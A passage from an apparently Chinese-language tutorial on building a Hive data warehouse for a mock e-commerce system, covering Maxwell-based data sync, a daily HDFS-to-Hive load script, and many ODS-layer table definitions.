gmall2020-mock-db-2021-10-10.jar</p><p>之后只修改/opt/module/db_log/application.properties文件中的mock.date参数，依次改为2020-06-12，2020-06-13，2020-06-14，并分别生成对应日期的数据。</p><p><strong>（2）全量表同步</strong></p><p>执行全量表同步脚本</p><p>[atguigu@hadoop102 bin]$ mysql_to_hdfs_full.sh all 2020-06-14</p><p>观察HDFS上是否出现全量表数据</p><p><strong>（3）增量表首日全量同步</strong></p><p>清除Maxwell断点记录</p><p>由于Maxwell支持断点续传，而上述重新生成业务数据的过程，会产生大量的binlog操作日志，这些日志我们并不需要。故此处需清除Maxwell的断点记录，另其从binlog最新的位置开始采集。</p><p>关闭Maxwell</p><p>[atguigu@hadoop102 bin]$ mxw.sh stop</p><p>清空Maxwell数据库，相当于初始化Maxwell</p><p>mysql&gt;</p><p>drop table maxwell.bootstrap;</p><p>drop table maxwell.columns;</p><p>drop table maxwell.databases;</p><p>drop table maxwell.heartbeats;</p><p>drop table maxwell.positions;</p><p>drop table maxwell.schemas;</p><p>drop table maxwell.tables;</p><p>修改Maxwell配置文件中的mock_date参数</p><p>[atguigu@hadoop102 maxwell]$ vim /opt/module/maxwell/config.properties</p><p><strong>mock_date=2020-06-14</strong></p><p>启动增量表数据通道，包括Maxwell、Kafka、Flume</p><p>执行增量表首日全量同步脚本</p><p>[atguigu@hadoop102 bin]$ mysql_to_kafka_inc_init.sh all</p><p>观察HDFS上是否出现全量表数据</p><h2 id="第7章-数仓开发之ODS层"><a href="#第7章-数仓开发之ODS层" class="headerlink" title="第7章 数仓开发之ODS层"></a>第7章 数仓开发之ODS层</h2><p>ODS层的设计要点如下：</p><p>1）ODS层的表结构设计依托于从业务系统同步过来的数据结构。</p><p>2）ODS层要保存全部历史数据，故其压缩格式应选择压缩比较高的，此处选择gzip。</p><p>3）ODS层表名的命名规范为：ods_表名_单分区增量全量标识（inc/full）。</p><h3 id="日志表"><a href="#日志表" class="headerlink" title="日志表"></a>日志表</h3><p><strong>1）建表数据</strong></p><p>DROP TABLE IF EXISTS ods_log_inc;</p><p>CREATE EXTERNAL TABLE ods_log_inc</p><p>(</p><p>`common` STRUCT&lt;ar :STRING,ba :STRING,ch :STRING,is_new :STRING,md<br>:STRING,mid :STRING,os :STRING,uid :STRING,vc</p><p>:STRING&gt; COMMENT ‘公共信息’,</p><p>`page` STRUCT&lt;during_time :STRING,item :STRING,item_type :STRING,last_page_id<br>:STRING,page_id</p><p>:STRING,source_type :STRING&gt; COMMENT ‘页面信息’,</p><p>`actions`<br>ARRAY&lt;STRUCT&lt;action_id:STRING,item:STRING,item_type:STRING,ts:BIGINT&gt;&gt;<br>COMMENT ‘动作信息’,</p><p>`displays` ARRAY&lt;STRUCT&lt;display_type :STRING,item :STRING,item_type<br>:STRING,`order` :STRING,pos_id</p><p>:STRING&gt;&gt; COMMENT ‘曝光信息’,</p><p>`start` STRUCT&lt;entry :STRING,loading_time :BIGINT,open_ad_id<br>:BIGINT,open_ad_ms :BIGINT,open_ad_skip_ms</p><p>:BIGINT&gt; COMMENT ‘启动信息’,</p><p>`err` STRUCT&lt;error_code:BIGINT,msg:STRING&gt; COMMENT ‘错误信息’,</p><p>`ts` BIGINT COMMENT ‘时间戳’</p><p>) COMMENT ‘活动信息表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_log_inc/‘;</p><p><strong>2）数据装载</strong></p><p>load data inpath ‘/origin_data/gmall/log/topic_log/2020-06-14’ into table<br>ods_log_inc partition(dt=’2020-06-14’);</p><p><strong>3）每日数据装载脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建hdfs_to_ods_log.sh</p><p>[atguigu@hadoop102 bin]$ vim hdfs_to_ods_log.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>## 定义变量方便修改</p><p>APP=gmall</p><p>## 如果是输入的日期按照取输入日期；如果没输入日期取当前时间的前一天</p><p>if [ -n “$1” ] ;then</p><p>do_date=$1</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>echo ================== 日志日期为 $do_date ==================</p><p>sql=”</p><p>load data inpath ‘/origin_data/$APP/log/topic_log/$do_date’ into table<br>${APP}.ods_log_inc partition(dt=’$do_date’);</p><p>“</p><p>hive -e “$sql”</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x hdfs_to_ods_log.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ hdfs_to_ods_log.sh 2020-06-14</p><h3 id="业务表"><a href="#业务表" class="headerlink" title="业务表"></a>业务表</h3><h4 id="活动信息表（全量表）"><a href="#活动信息表（全量表）" class="headerlink" title="活动信息表（全量表）"></a>活动信息表（全量表）</h4><p>DROP TABLE IF EXISTS ods_activity_info_full;</p><p>CREATE EXTERNAL TABLE ods_activity_info_full</p><p>(</p><p>`id` STRING COMMENT ‘活动id’,</p><p>`activity_name` STRING COMMENT ‘活动名称’,</p><p>`activity_type` STRING COMMENT ‘活动类型’,</p><p>`activity_desc` STRING COMMENT ‘活动描述’,</p><p>`start_time` STRING COMMENT ‘开始时间’,</p><p>`end_time` STRING COMMENT ‘结束时间’,</p><p>`create_time` STRING COMMENT ‘创建时间’</p><p>) COMMENT ‘活动信息表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_activity_info_full/‘;</p><h4 id="活动规则表（全量表）"><a href="#活动规则表（全量表）" class="headerlink" title="活动规则表（全量表）"></a>活动规则表（全量表）</h4><p>DROP TABLE IF EXISTS ods_activity_rule_full;</p><p>CREATE EXTERNAL TABLE ods_activity_rule_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`activity_id` STRING COMMENT ‘类型’,</p><p>`activity_type` STRING COMMENT ‘活动类型’,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT ‘满减金额’,</p><p>`condition_num` BIGINT COMMENT ‘满减件数’,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT ‘优惠金额’,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT ‘优惠折扣’,</p><p>`benefit_level` STRING COMMENT ‘优惠级别’</p><p>) COMMENT ‘活动规则表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_activity_rule_full/‘;</p><h4 id="一级品类表（全量表）"><a href="#一级品类表（全量表）" class="headerlink" title="一级品类表（全量表）"></a>一级品类表（全量表）</h4><p>DROP TABLE IF EXISTS ods_base_category1_full;</p><p>CREATE EXTERNAL TABLE ods_base_category1_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`name` STRING COMMENT ‘分类名称’</p><p>) COMMENT ‘一级品类表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_base_category1_full/‘;</p><h4 id="二级品类表（全量表）"><a href="#二级品类表（全量表）" class="headerlink" title="二级品类表（全量表）"></a>二级品类表（全量表）</h4><p>DROP TABLE IF EXISTS ods_base_category2_full;</p><p>CREATE EXTERNAL TABLE ods_base_category2_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`name` STRING COMMENT ‘二级分类名称’,</p><p>`category1_id` STRING COMMENT ‘一级分类编号’</p><p>) COMMENT ‘二级品类表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_base_category2_full/‘;</p><h4 id="三级品类表（全量表）"><a href="#三级品类表（全量表）" class="headerlink" title="三级品类表（全量表）"></a>三级品类表（全量表）</h4><p>DROP TABLE IF EXISTS ods_base_category3_full;</p><p>CREATE EXTERNAL TABLE ods_base_category3_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`name` STRING COMMENT ‘三级分类名称’,</p><p>`category2_id` STRING COMMENT ‘二级分类编号’</p><p>) COMMENT ‘三级品类表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_base_category3_full/‘;</p><h4 id="编码字典表（全量表）"><a href="#编码字典表（全量表）" class="headerlink" title="编码字典表（全量表）"></a>编码字典表（全量表）</h4><p>DROP TABLE IF EXISTS ods_base_dic_full;</p><p>CREATE EXTERNAL TABLE ods_base_dic_full</p><p>(</p><p>`dic_code` STRING COMMENT ‘编号’,</p><p>`dic_name` STRING COMMENT ‘编码名称’,</p><p>`parent_code` STRING COMMENT ‘父编号’,</p><p>`create_time` STRING COMMENT ‘创建日期’,</p><p>`operate_time` STRING COMMENT ‘修改日期’</p><p>) COMMENT ‘编码字典表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_base_dic_full/‘;</p><h4 id="省份表（全量表）"><a href="#省份表（全量表）" class="headerlink" title="省份表（全量表）"></a>省份表（全量表）</h4><p>DROP TABLE IF EXISTS ods_base_province_full;</p><p>CREATE EXTERNAL TABLE ods_base_province_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`name` STRING COMMENT ‘省份名称’,</p><p>`region_id` STRING COMMENT ‘地区ID’,</p><p>`area_code` STRING COMMENT ‘地区编码’,</p><p>`iso_code` STRING COMMENT ‘旧版ISO-3166-2编码，供可视化使用’,</p><p>`iso_3166_2` STRING COMMENT ‘新版IOS-3166-2编码，供可视化使用’</p><p>) COMMENT ‘省份表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_base_province_full/‘;</p><h4 id="地区表（全量表）"><a href="#地区表（全量表）" class="headerlink" title="地区表（全量表）"></a>地区表（全量表）</h4><p>DROP TABLE IF EXISTS ods_base_region_full;</p><p>CREATE EXTERNAL TABLE ods_base_region_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`region_name` STRING COMMENT ‘地区名称’</p><p>) COMMENT ‘地区表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_base_region_full/‘;</p><h4 id="品牌表（全量表）"><a href="#品牌表（全量表）" class="headerlink" title="品牌表（全量表）"></a>品牌表（全量表）</h4><p>DROP TABLE IF EXISTS ods_base_trademark_full;</p><p>CREATE EXTERNAL TABLE ods_base_trademark_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`tm_name` STRING COMMENT ‘品牌名称’,</p><p>`logo_url` STRING COMMENT ‘品牌logo的图片路径’</p><p>) COMMENT ‘品牌表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_base_trademark_full/‘;</p><h4 id="购物车表（全量表）"><a href="#购物车表（全量表）" class="headerlink" title="购物车表（全量表）"></a>购物车表（全量表）</h4><p>DROP TABLE IF EXISTS ods_cart_info_full;</p><p>CREATE EXTERNAL TABLE ods_cart_info_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`cart_price` DECIMAL(16, 2) COMMENT ‘放入购物车时价格’,</p><p>`sku_num` BIGINT COMMENT ‘数量’,</p><p>`img_url` BIGINT COMMENT ‘商品图片地址’,</p><p>`sku_name` STRING COMMENT ‘sku名称 (冗余)’,</p><p>`is_checked` STRING COMMENT ‘是否被选中’,</p><p>`create_time` STRING COMMENT ‘创建时间’,</p><p>`operate_time` STRING COMMENT ‘修改时间’,</p><p>`is_ordered` STRING COMMENT ‘是否已经下单’,</p><p>`order_time` STRING COMMENT ‘下单时间’,</p><p>`source_type` STRING COMMENT ‘来源类型’,</p><p>`source_id` STRING COMMENT ‘来源编号’</p><p>) COMMENT ‘购物车全量表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_cart_info_full/‘;</p><h4 id="优惠券信息表（全量表）"><a href="#优惠券信息表（全量表）" class="headerlink" title="优惠券信息表（全量表）"></a>优惠券信息表（全量表）</h4><p>DROP TABLE IF EXISTS ods_coupon_info_full;</p><p>CREATE EXTERNAL TABLE ods_coupon_info_full</p><p>(</p><p>`id` STRING COMMENT ‘购物券编号’,</p><p>`coupon_name` STRING COMMENT ‘购物券名称’,</p><p>`coupon_type` STRING COMMENT ‘购物券类型 1 现金券 2 折扣券 3 满减券 4<br>满件打折券’,</p><p>`condition_amount` DECIMAL(16, 2) COMMENT ‘满额数’,</p><p>`condition_num` BIGINT COMMENT ‘满件数’,</p><p>`activity_id` STRING COMMENT ‘活动编号’,</p><p>`benefit_amount` DECIMAL(16, 2) COMMENT ‘减金额’,</p><p>`benefit_discount` DECIMAL(16, 2) COMMENT ‘折扣’,</p><p>`create_time` STRING COMMENT ‘创建时间’,</p><p>`range_type` STRING COMMENT ‘范围类型 1、商品 2、品类 3、品牌’,</p><p>`limit_num` BIGINT COMMENT ‘最多领用次数’,</p><p>`taken_count` BIGINT COMMENT ‘已领用次数’,</p><p>`start_time` STRING COMMENT ‘开始领取时间’,</p><p>`end_time` STRING COMMENT ‘结束领取时间’,</p><p>`operate_time` STRING COMMENT ‘修改时间’,</p><p>`expire_time` STRING COMMENT ‘过期时间’</p><p>) COMMENT ‘优惠券信息表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_coupon_info_full/‘;</p><h4 id="商品平台属性表（全量表）"><a href="#商品平台属性表（全量表）" class="headerlink" title="商品平台属性表（全量表）"></a>商品平台属性表（全量表）</h4><p>DROP TABLE IF EXISTS ods_sku_attr_value_full;</p><p>CREATE EXTERNAL TABLE ods_sku_attr_value_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`attr_id` STRING COMMENT ‘平台属性ID’,</p><p>`value_id` STRING COMMENT ‘平台属性值ID’,</p><p>`sku_id` STRING COMMENT ‘商品ID’,</p><p>`attr_name` STRING COMMENT ‘平台属性名称’,</p><p>`value_name` STRING COMMENT ‘平台属性值名称’</p><p>) COMMENT ‘sku平台属性表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_sku_attr_value_full/‘;</p><h4 id="商品表（全量表）"><a href="#商品表（全量表）" class="headerlink" title="商品表（全量表）"></a>商品表（全量表）</h4><p>DROP TABLE IF EXISTS ods_sku_info_full;</p><p>CREATE EXTERNAL TABLE ods_sku_info_full</p><p>(</p><p>`id` STRING COMMENT ‘skuId’,</p><p>`spu_id` STRING COMMENT ‘spuid’,</p><p>`price` DECIMAL(16, 2) COMMENT ‘价格’,</p><p>`sku_name` STRING COMMENT ‘商品名称’,</p><p>`sku_desc` STRING COMMENT ‘商品描述’,</p><p>`weight` DECIMAL(16, 2) COMMENT ‘重量’,</p><p>`tm_id` STRING COMMENT ‘品牌id’,</p><p>`category3_id` STRING COMMENT ‘品类id’,</p><p>`sku_default_igm` STRING COMMENT ‘商品图片地址’,</p><p>`is_sale` STRING COMMENT ‘是否在售’,</p><p>`create_time` STRING COMMENT ‘创建时间’</p><p>) COMMENT ‘SKU商品表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_sku_info_full/‘;</p><h4 id="商品销售属性值表（全量表）"><a href="#商品销售属性值表（全量表）" class="headerlink" title="商品销售属性值表（全量表）"></a>商品销售属性值表（全量表）</h4><p>DROP TABLE IF EXISTS ods_sku_sale_attr_value_full;</p><p>CREATE EXTERNAL TABLE ods_sku_sale_attr_value_full</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`sku_id` STRING COMMENT ‘sku_id’,</p><p>`spu_id` STRING COMMENT ‘spu_id’,</p><p>`sale_attr_value_id` STRING COMMENT ‘销售属性值id’,</p><p>`sale_attr_id` STRING COMMENT ‘销售属性id’,</p><p>`sale_attr_name` STRING COMMENT ‘销售属性名称’,</p><p>`sale_attr_value_name` STRING COMMENT ‘销售属性值名称’</p><p>) COMMENT ‘sku销售属性名称’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_sku_sale_attr_value_full/‘;</p><h4 id="SPU表（全量表）"><a href="#SPU表（全量表）" class="headerlink" title="SPU表（全量表）"></a>SPU表（全量表）</h4><p>DROP TABLE IF EXISTS ods_spu_info_full;</p><p>CREATE EXTERNAL TABLE ods_spu_info_full</p><p>(</p><p>`id` STRING COMMENT ‘spu_id’,</p><p>`spu_name` STRING COMMENT ‘spu名称’,</p><p>`description` STRING COMMENT ‘描述信息’,</p><p>`category3_id` STRING COMMENT ‘品类id’,</p><p>`tm_id` STRING COMMENT ‘品牌id’</p><p>) COMMENT ‘SPU商品表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>NULL DEFINED AS ‘’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_spu_info_full/‘;</p><h4 id="购物车表（增量表）"><a href="#购物车表（增量表）" class="headerlink" title="购物车表（增量表）"></a>购物车表（增量表）</h4><p>DROP TABLE IF EXISTS ods_cart_info_inc;</p><p>CREATE EXTERNAL TABLE ods_cart_info_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,sku_id :STRING,cart_price<br>:DECIMAL(16, 2),sku_num :BIGINT,img_url :STRING,sku_name</p><p>:STRING,is_checked :STRING,create_time :STRING,operate_time :STRING,is_ordered<br>:STRING,order_time</p><p>:STRING,source_type :STRING,source_id :STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘购物车增量表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_cart_info_inc/‘;</p><h4 id="评论表（增量表）"><a href="#评论表（增量表）" class="headerlink" title="评论表（增量表）"></a>评论表（增量表）</h4><p>DROP TABLE IF EXISTS ods_comment_info_inc;</p><p>CREATE EXTERNAL TABLE ods_comment_info_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,nick_name :STRING,head_img<br>:STRING,sku_id :STRING,spu_id :STRING,order_id</p><p>:STRING,appraise :STRING,comment_txt :STRING,create_time :STRING,operate_time<br>:STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘评价表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_comment_info_inc/‘;</p><h4 id="优惠券领用表（增量表）"><a href="#优惠券领用表（增量表）" class="headerlink" title="优惠券领用表（增量表）"></a>优惠券领用表（增量表）</h4><p>DROP TABLE IF EXISTS ods_coupon_use_inc;</p><p>CREATE EXTERNAL TABLE ods_coupon_use_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,coupon_id :STRING,user_id :STRING,order_id<br>:STRING,coupon_status :STRING,get_time :STRING,using_time</p><p>:STRING,used_time :STRING,expire_time :STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘优惠券领用表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_coupon_use_inc/‘;</p><h4 id="收藏表（增量表）"><a href="#收藏表（增量表）" class="headerlink" title="收藏表（增量表）"></a>收藏表（增量表）</h4><p>DROP TABLE IF EXISTS ods_favor_info_inc;</p><p>CREATE EXTERNAL TABLE ods_favor_info_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,sku_id :STRING,spu_id<br>:STRING,is_cancel :STRING,create_time :STRING,cancel_time</p><p>:STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘收藏表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_favor_info_inc/‘;</p><h4 id="订单明细表（增量表）"><a href="#订单明细表（增量表）" class="headerlink" title="订单明细表（增量表）"></a>订单明细表（增量表）</h4><p>DROP TABLE IF EXISTS ods_order_detail_inc;</p><p>CREATE EXTERNAL TABLE ods_order_detail_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,sku_id :STRING,sku_name<br>:STRING,img_url :STRING,order_price</p><p>:DECIMAL(16, 2),sku_num :BIGINT,create_time :STRING,source_type<br>:STRING,source_id :STRING,split_total_amount</p><p>:DECIMAL(16, 2),split_activity_amount :DECIMAL(16, 2),split_coupon_amount</p><p>:DECIMAL(16, 2)&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘订单明细表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_order_detail_inc/‘;</p><h4 id="订单明细活动关联表（增量表）"><a href="#订单明细活动关联表（增量表）" class="headerlink" title="订单明细活动关联表（增量表）"></a>订单明细活动关联表（增量表）</h4><p>DROP TABLE IF EXISTS ods_order_detail_activity_inc;</p><p>CREATE EXTERNAL TABLE ods_order_detail_activity_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,order_detail_id :STRING,activity_id<br>:STRING,activity_rule_id :STRING,sku_id</p><p>:STRING,create_time :STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘订单明细活动关联表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_order_detail_activity_inc/‘;</p><h4 id="订单明细优惠券关联表（增量表）"><a href="#订单明细优惠券关联表（增量表）" class="headerlink" title="订单明细优惠券关联表（增量表）"></a>订单明细优惠券关联表（增量表）</h4><p>DROP TABLE IF EXISTS ods_order_detail_coupon_inc;</p><p>CREATE EXTERNAL TABLE ods_order_detail_coupon_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,order_detail_id :STRING,coupon_id<br>:STRING,coupon_use_id :STRING,sku_id</p><p>:STRING,create_time :STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘订单明细优惠券关联表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_order_detail_coupon_inc/‘;</p><h4 id="订单表（增量表）"><a href="#订单表（增量表）" class="headerlink" title="订单表（增量表）"></a>订单表（增量表）</h4><p>DROP TABLE IF EXISTS ods_order_info_inc;</p><p>CREATE EXTERNAL TABLE ods_order_info_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,consignee :STRING,consignee_tel :STRING,total_amount<br>:DECIMAL(16, 2),order_status :STRING,user_id</p><p>:STRING,payment_way :STRING,delivery_address :STRING,order_comment<br>:STRING,out_trade_no :STRING,trade_body</p><p>:STRING,create_time :STRING,operate_time :STRING,expire_time<br>:STRING,process_status :STRING,tracking_no</p><p>:STRING,parent_order_id :STRING,img_url :STRING,province_id<br>:STRING,activity_reduce_amount</p><p>:DECIMAL(16, 2),coupon_reduce_amount :DECIMAL(16, 2),original_total_amount<br>:DECIMAL(16, 2),freight_fee</p><p>:DECIMAL(16, 2),freight_fee_reduce :DECIMAL(16, 2),refundable_time :DECIMAL(16,<br>2)&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘订单表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_order_info_inc/‘;</p><h4 id="退单表（增量表）"><a href="#退单表（增量表）" class="headerlink" title="退单表（增量表）"></a>退单表（增量表）</h4><p>DROP TABLE IF EXISTS ods_order_refund_info_inc;</p><p>CREATE EXTERNAL TABLE ods_order_refund_info_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,order_id :STRING,sku_id<br>:STRING,refund_type :STRING,refund_num :BIGINT,refund_amount</p><p>:DECIMAL(16, 2),refund_reason_type :STRING,refund_reason_txt<br>:STRING,refund_status :STRING,create_time</p><p>:STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘退单表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_order_refund_info_inc/‘;</p><h4 id="订单状态流水表（增量表）"><a href="#订单状态流水表（增量表）" class="headerlink" title="订单状态流水表（增量表）"></a>订单状态流水表（增量表）</h4><p>DROP TABLE IF EXISTS ods_order_status_log_inc;</p><p>CREATE EXTERNAL TABLE ods_order_status_log_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,order_status :STRING,operate_time<br>:STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘退单表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_order_status_log_inc/‘;</p><h4 id="支付表（增量表）"><a href="#支付表（增量表）" class="headerlink" title="支付表（增量表）"></a>支付表（增量表）</h4><p>DROP TABLE IF EXISTS ods_payment_info_inc;</p><p>CREATE EXTERNAL TABLE ods_payment_info_inc</p><p>(</p><p>`type` STRING COMMENT ‘变动类型’,</p><p>`ts` BIGINT COMMENT ‘变动时间’,</p><p>`data` STRUCT&lt;id :STRING,out_trade_no :STRING,order_id :STRING,user_id<br>:STRING,payment_type :STRING,trade_no</p><p>:STRING,total_amount :DECIMAL(16, 2),subject :STRING,payment_status<br>:STRING,create_time :STRING,callback_time</p><p>:STRING,callback_content :STRING&gt; COMMENT ‘数据’,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT ‘旧值’</p><p>) COMMENT ‘支付表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE ‘org.apache.hadoop.hive.serde2.JsonSerDe’</p><p>LOCATION ‘/warehouse/gmall/ods/ods_payment_info_inc/‘;</p><h4 